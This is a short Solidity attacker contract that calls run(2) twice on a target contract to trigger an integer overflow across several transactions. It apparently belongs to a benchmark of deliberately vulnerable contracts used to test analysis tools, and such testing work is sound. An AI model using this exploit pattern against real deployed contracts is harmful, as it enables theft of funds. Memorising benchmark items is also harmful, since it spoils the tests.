pragma solidity ^0.4.23;

import "./integer_overflow_multitx_onefunc_feasible.sol";

contract IntegerOverflowMultiTxOneFuncFeasibleAttacker {
    IntegerOverflowMultiTxOneFuncFeasible public target;

    function IntegerOverflowMultiTxOneFuncFeasibleAttacker(address _targetAddress) public {
        target = IntegerOverflowMultiTxOneFuncFeasible(_targetAddress);
    }

    function attack() public {
        target.run(2);

        target.run(2);
    }
}